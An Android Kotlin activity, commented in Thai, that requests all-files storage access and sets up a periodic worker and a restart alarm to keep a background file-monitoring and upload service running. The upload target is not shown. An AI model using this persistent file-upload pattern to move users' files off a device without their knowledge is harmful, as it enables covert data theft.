package com.example.uploadbackground

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST_CODE = 100 // รหัสการร้องขอสิทธิ์ เลขอะไรก็ได้
    }

    private lateinit var manageExternalStorageLauncher: ActivityResultLauncher<Intent>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ตั้งข้อกำหนดสำหรับ WorkManager เพื่อให้แน่ใจว่ามีการเชื่อมต่อเครือข่าย
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        // สร้างการร้องขอการทำงานแบบเป็นระยะสำหรับ FileMonitorWorker ที่ทำงานทุก 15 นาที
        val periodicWorkRequest = PeriodicWorkRequestBuilder<FileMonitorWorker>(
            repeatInterval = 15, // ระยะเวลาการทำซ้ำ
            repeatIntervalTimeUnit = TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        // เริ่มต้น WorkManager และตั้งค่าการทำงานแบบเป็นระยะ
        val workManager = WorkManager.getInstance(applicationContext)
        workManager.enqueueUniquePeriodicWork(
            "FileMonitorWorker",
            ExistingPeriodicWorkPolicy.REPLACE, // แทนที่งานที่มีชื่อเดียวกัน
            periodicWorkRequest
        )

        // ActivityResultLauncher สำหรับจัดการคำขอสิทธิ์
        manageExternalStorageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            // จัดการผลลัพธ์ของคำขอสิทธิ์
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    // หากได้รับสิทธิ์แล้ว ให้เริ่มต้นกระบวนการอัพโหลดไฟล์
                    initializeFileAndStartUpload()
                    RestartServiceReceiver.scheduleAlarm(this)
                } else {
                    // แสดงป๊อปอัพหากสิทธิ์ถูกปฏิเสธ
                    showPermissionDeniedDialog()
                }
            }
        }

        // ตรวจสอบและขอสิทธิ์การเข้าถึงที่จำเป็น
        checkAndRequestPermissions()
    }

    // Worker ที่ทำงานใน background เพื่อเริ่มต้น FileMonitorService
    class FileMonitorWorker(appContext: Context, workerParams: WorkerParameters) : Worker(appContext, workerParams) {

        override fun doWork(): Result {
            // สร้าง Intent สำหรับเริ่มต้น FileMonitorService
            val serviceIntent = Intent(applicationContext, FileMonitorService::class.java)
            applicationContext.startService(serviceIntent)
            return Result.success()
        }
    }

    // ฟังก์ชันเริ่มต้น FileMonitorService และเริ่มต้นการอัพโหลด
    private fun initializeFileAndStartUpload() {
        val serviceIntent = Intent(this, FileMonitorService::class.java)
        startService(serviceIntent)
    }

    // ตรวจสอบและขอสิทธิ์การเข้าถึง
    private fun checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // สำหรับ Android 11 และสูงกว่า ตรวจสอบสิทธิ์การเข้าถึงจัดเก็บข้อมูล
            if (Environment.isExternalStorageManager()) {
                initializeFileAndStartUpload()
            } else {
                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                manageExternalStorageLauncher.launch(intent)
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // สำหรับ Android 6.0 ถึง 10 ตรวจสอบสิทธิ์การเข้าถึงจัดเก็บข้อมูล
            if (checkPermissions()) {
                initializeFileAndStartUpload()
            } else {
                requestPermissions()
            }
        } else {
            // สำหรับ Android เวอร์ชันต่ำกว่า 6.0 ใช้สิทธิ์การเข้าถึงจัดเก็บข้อมูลโดยไม่ต้องขอ
            initializeFileAndStartUpload()
        }
    }

    // ตรวจสอบว่ามีสิทธิ์ที่จำเป็นทั้งหมดหรือไม่
    private fun checkPermissions(): Boolean {
        val permissions = getRequiredPermissions()
        return permissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
    }

    // รับรายการสิทธิ์ที่จำเป็น
    private fun getRequiredPermissions(): Array<String> {
        val permissions = mutableListOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
        }
        return permissions.toTypedArray()
    }

    // ขอสิทธิ์ที่จำเป็น
    private fun requestPermissions() {
        ActivityCompat.requestPermissions(this, getRequiredPermissions(), PERMISSION_REQUEST_CODE)
    }

    // จัดการผลลัพธ์ของคำขอสิทธิ์
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                val serviceIntent = Intent(this, FileMonitorService::class.java)
                startService(serviceIntent)
            } else {
                showPermissionDeniedDialog()
            }
        }
    }

    // แสดงป๊อปอัพหากสิทธิ์ถูกปฏิเสธ
    private fun showPermissionDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permission Denied")
            .setMessage("This app requires access to storage. Please grant permission in settings.")
            .setPositiveButton("Go to Settings") { _, _ ->
                openAppSettings()
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
                Toast.makeText(this, "Operation cannot continue without permission", Toast.LENGTH_LONG).show()
            }
            .create()
            .show()
    }

    // เปิดการตั้งค่าแอปพลิเคชันเพื่อให้ผู้ใช้อนุญาตสิทธิ์
    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        startActivityForResult(intent, PERMISSION_REQUEST_CODE)
    }
}
